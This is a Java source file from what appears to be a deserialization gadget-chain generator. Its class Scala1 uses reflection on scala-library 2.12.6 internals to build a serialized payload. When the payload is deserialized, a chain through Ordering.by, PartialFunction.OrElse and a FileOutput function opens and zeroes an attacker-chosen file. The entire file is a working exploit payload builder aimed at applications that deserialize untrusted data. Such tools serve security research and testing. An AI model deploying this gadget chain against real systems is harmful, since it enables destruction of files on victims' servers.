package org.ses.gadgetbuilder.chains2;

import org.ses.gadgetbuilder.annotations.Authors;
import org.ses.gadgetbuilder.annotations.Dependencies;
import org.ses.gadgetbuilder.annotations.Impact;
import org.ses.gadgetbuilder.chains.main.GadgetChain;
import org.ses.gadgetbuilder.chains.main.TrampolineConnector;
import org.ses.gadgetbuilder.chains.trampolines.doubleparam.CompareTrampoline;
import org.ses.gadgetbuilder.util.Reflections;
import scala.Function0;
import scala.Function1;
import scala.PartialFunction;
import scala.math.Ordering$;
import scala.sys.process.processInternal$;

import java.io.File;

@Dependencies({"org.scala-lang:scala-library:2.12.6"})
@Authors({ Authors.JACKOFMOSTTRADES })
@Impact(Impact.ZeroFile)
public class Scala1 extends GadgetChain<CompareTrampoline> {

    public Scala1(CompareTrampoline _trampoline) {
        super(_trampoline);
    }

    @Override
    protected TrampolineConnector createPayload(String command) throws Exception {

        Class<?> clazz = Class.forName("scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3");
        Function0<Object> exploitFunction = (Function0<Object>) Reflections.createWithoutConstructor(clazz);
        Reflections.setFieldValue(exploitFunction, "file$1", new File(command));
        Reflections.setFieldValue(exploitFunction, "append$1", false);

        PartialFunction<Throwable, Object> onf = processInternal$.MODULE$.onInterrupt(exploitFunction);

        Function1<Throwable, Object> f = new PartialFunction.OrElse(onf, onf);


        return new TrampolineConnector(Ordering$.MODULE$.<Throwable, Object>by(f, null), new InterruptedException(), new InterruptedException());
    }

    @Override
    protected void postProcessPayload() throws Exception {

    }

    @Override
    protected String getStackTrace() {
        return "scala.math.Ordering$$anon$5.compare()\n" +
                "scala.PartialFunction$OrElse.apply()\n" +
                "scala.sys.process.processInternal$$anonfun$onIOInterrupt$1.applyOrElse()\n" +
                "scala.sys.process.ProcessBuilderImpl$FileOutput$$anonfun$$lessinit$greater$3.apply()\n" +
                "java.io.FileOutputStream.<init>()";
    }

}
